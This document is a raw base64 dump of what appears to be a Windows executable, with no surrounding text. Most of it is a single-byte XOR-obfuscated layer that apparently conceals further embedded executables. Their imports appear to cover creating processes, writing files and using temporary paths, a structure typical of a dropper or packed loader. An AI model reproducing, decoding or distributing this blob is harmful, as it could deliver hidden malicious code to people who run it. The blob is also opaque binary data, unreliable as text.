dVV29bV1IU7wPBQUFY79dU+i8BQUFBcYAAAAAAABWjIgYGxgYGBwYGBjn5xgYoBgYGBgYGBhYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBjAGBgYFgeiFhisEdU5oBlU1TlMcHFrOGhqd39qeXU4e3l2dndsOHp9OGptdjhxdjhcV0s4dXd8fTYVFRI8GBgYGBgYGOuZXlmv+DAKr/gwCq/4MAqmgKMKrPgwCq/4MQqg+DAKoqrVCq74MAqiqusKrvgwCqKq7gqu+DAKSnF7cK/4MAoYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBhIXRgYVBkdGLHLhUMYGBgYGBgYGPgYGjkTGRQYGBwYGBgSGBgYGBgYqAoYGBgIGBgYOBgYGBgYCBgIGBgYGhgYHRgZGBgYGBgdGBkYGBgYGBh4GBgYHBgYGBgYGBoYWB0YGAgYGAgYGBgYCBgYCBgYGBgYGAgYGBgYGBgYGBgYGKQ4GBgwGBgYGFgYGPgZGBgYGBgYGBgYGBgYGBgYGBgYGEgYGFQYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYOBgYWBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGDZsfWBsGBgY6hoYGBgIGBgYHBgYGBwYGBgYGBgYGBgYGBgYGDgYGHg2anx5bHkYGAQaGBgYOBgYGBwYGBgQGBgYGBgYGBgYGBgYGBhYGBhYNnx5bHkYGBgYGhgYGCgYGBgaGBgYFBgYGBgYGBgYGBgYGBgYWBgY2DZqa2p7GBgY+BkYGBhYGBgYGhgYGBYYGBgYGBgYGBgYGBgYGFgYGFg2an10d3sYGFQYGBgYSBgYGBoYGBgIGBgYGBgYGBgYGBgYGBhYGBhaGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgY29TU1NTU1NTU1NTU1NTU1E2T9Jv0PEtOT3AYKBgIchlyGHAYKBgI5w0wOBgISHBYOBgI8NDn5+eb3AxwOFYYGHAYKBgI5w0MOBgIndhtF+cNNDgYCCvYR0ZDk/1F23IYchhyG3IYchhwGBgY2HAYKBgI5w08OBgIk+Cb5+dsyOcNIDgYCHIYkV3wlV3oSHIUlV343134gbGyskhP31389ea1xt9d6BgYGBjnDQA4GAid2G0O5w00OBgIT+cNLDgYCCvYR0ZDk/1F2yvDF0/YphQYGBiRReR+Fwtd+JFF8IhyGJVd5EhOlRxDlVyd+EhP5w04OBgIndhtFecNNDgYCCXyGBgYbRAbReQzbeRtyZll+IGxsrJtupll/PXmtcZtgedt8HIYcgjnDQQ4GAib4Odsn5MtLDgYCEjnznIYlV3k313kGBgYGEhyHJVd4N9d4BgYGBhIT+cNODgYCJMFNDgYCJ3YbRHnyyXyGBgYbR+TXeCd2G0W58tP584r2EdGQ5P9RdtyHHAYKBgYm9gaSHIY5w0oOBgIkV30u+QpGAid2GzLk23gK9GRVeyVfDwYchiVTeQb2UpOSE/nDTg4GAid2G0R58sl8hgYGG0Jk1XsG1Xkk130kVXsM23kbcnnLeQpGAhyGXIYchxwkDgYCPAT5ufnm9wMT+cNLDgYCLnkKRgIR0ZDk/1F29TU1NTUTZP0m/RATk8XT9jfXfAYGBgYcBgpGAhyGOsXZ12wchiT6d9dsFwYGBjrF2ddoOsXZ13Q6xdnXcDrF2dd6OcNHDgYCJPglV3oSJVdsEhyGHIYchhyGHIYchhyGE7nDRA4GAid2Gw4cAg/GBjnbejnDRQ4GAhP5w0sOBgIoBkYGBhHRpP9RdtP5w0sOBgIRyvYRpP9RdvU1NTU1NTU1NTU1E2T9Jv84EnnVRRObBSgGRgYGEaT/UXaFBjwWuXn55Pone5sDZPW8C3n5+dwGFgYGHIYTucNCDgYCHIY5w0YOBgI1BgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGDw5GBgqORgYWjkYGEw5GBhyORgYYDkYGJI5GBiOORgYvDkYGKg5GBimORgY0jkYGMI5GBjyORgY4DkYGBgYGBhUGEgYXRg4GFwYVBhUGCIYOBhMGGoYYRhxGHYYfxg4GGwYdxg4GFcYaBh9GHYYOBhIGHEYaBh9GDgYNRg4GD0YbxhrGBgYGBhUGEgYXRg4GFwYVBhUGCIYOBhMGHkYahh/GH0YbBg4GGgYeRhsGHAYIhg4GD0YbxhrGBgY/DgYGBgYGBgYGBgYFjoYGBg4GBgYGBgYGBgYGBgYGBgYGBgYGBgYGDw5GBgqORgYWjkYGEw5GBhyORgYYDkYGJI5GBiOORgYvDkYGKg5GBimORgY0jkYGMI5GBjyORgY4DkYGBgYGBgBGV1gcWxIand7fWtrGIYYW2p9eWx9VW1sfWBPGBiwGFtqfXlsfUhqd3t9a2tPGBjhHE95cWxed2pLcXZ/dH1XenJ9e2wY9BxOcWpsbXl0Xmp9fRgYHU95cWxWeXV9fEhxaH1PGBg9HU9qcWx9XnF0fRiYG1dofXZIand7fWtrGNgbSn15fF5xdH0YGJcYW2p9eWx9XnF0fU8YVh10a2xqdH12TxgYGhpffWxUeWtsXWpqd2oYGPEcTnFqbG15dFl0dHd7GBhKGFt0d2t9UHl2fHR9GNkZX31sW21qan12bEhqd3t9a2tRfBhTXUpWXVQrKjZ8dHQYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRgYGBgYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGRgAGBgYABgYmBgYGBgYGBgYGBgYGBgYGRgaGBgYKBgYmBgYGBgYGBgYGBgYGBgYGRgRHBgYUBgYGHhYGBhlGRgYGBgYGBgYGBgYGBgYGBgYGCQnYHV0OG59amtxd3YlPyk2KD84fXZ7d3xxdn8lP01MXjUgPzhrbHl2fHl0d3Z9JT9hfWs/JyYVEiR5a2t9dXp0YThgdXR2ayU/bWp2Imt7cH11eWs1dXF7andrd35sNXt3dSJ5a3U2bik/OHV5dnF+fWtsTn1qa3F3diU/KTYoPyYVEjg4JGxqbWtsUXZ+dzhgdXR2ayU6bWp2Imt7cH11eWs1dXF7andrd35sNXt3dSJ5a3U2bis6JhUSODg4OCRrfXttanFsYSYVEjg4ODg4OCRqfWltfWtsfXxIanFucXR9f31rJhUSODg4ODg4ODgkan1pbX1rbH18XWB9e21scXd2VH1ufXQ4dH1ufXQlP3lrUXZud3N9aj84bXFZe3t9a2slP355dGt9Pzg3JhUSODg4ODg4JDdqfWltfWtsfXxIanFucXR9f31rJhUSODg4OCQ3a317bWpxbGEmFRI4OCQ3bGpta2xRdn53JhUSJDd5a2t9dXp0YSYVEhgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGAgYGFQYGBgCKDsoMSg3KFkoXyhJKHYobCiZKLQoriilKOoo5CgyKS0pQSlHKYwphCmlKfkp9CnjKRgqOypXKnYqmCqfKoEq/Sr1KhgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgJZIgYGxgYGBwYGBjn5xgYoBgYGBgYGBhYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBjAGBgYFgeiFhisEdU5oBlU1TlMcHFrOGhqd39qeXU4e3l2dndsOHp9OGptdjhxdjhcV0s4dXd8fTYVFRI8GBgYGBgYGOuZXlmv+DAKr/gwCq/4MAqmgKMKrPgwCq/4MQqg+DAKoqrVCq74MAqiqusKrvgwCqKq7gqu+DAKSnF7cK/4MAoYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBhIXRgYfJ4dGOHJhUMYGBgYGBgYGOgYOjgTGhQYGB4YGBgUGBgYGBgYyAsYGBgIGBgYGBiYGRgYGBgIGBgYGhgYHRgaGBgYGBgdGBoYGBgYGBh4GBgYHBgYGBgYGBoYeBkYGAgYGBgYGBgIGBgYGBgYGBgIGBgYGBgYCBgYGBgYGBgYGBgIGBgYGBgYGBgYGBhkORgYMBgYGBhIGBj4GRgYGFgYGEwYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGDgYGJgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBg2bH1gbBgYGAIcGBgYCBgYGB4YGBgcGBgYGBgYGBgYGBgYGBg4GBh4Nmp8eWx5GBg4GxgYGDgYGBgcGBgYEhgYGBgYGBgYGBgYGBgYWBgYWDZ8eWx5GBgYEBoYGBgoGBgYGhgYGBYYGBgYGBgYGBgYGBgYGFgYGNg2aHx5bHkYGEwYGBgYWBgYGBoYGBgIGBgYGBgYGBgYGBgYGBhYGBhYNmpransYGBj4GRgYGEgYGBgaGBgYChgYGBgYGBgYGBgYGBgYWBgYWBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBg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YGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGFkYWRhZGBgYGBhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGFoYWhhaGBgYGBgYGBgYCAgYGHoIGBjkOBgYeggYGK4IGBgcORgYrggYGAEJGBgEORgYAQkYGNEKGBggORgY0QoYGMYKGBhUORgY+AoYGNELGBhEORgYyAsYGAIMGBhoORgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBg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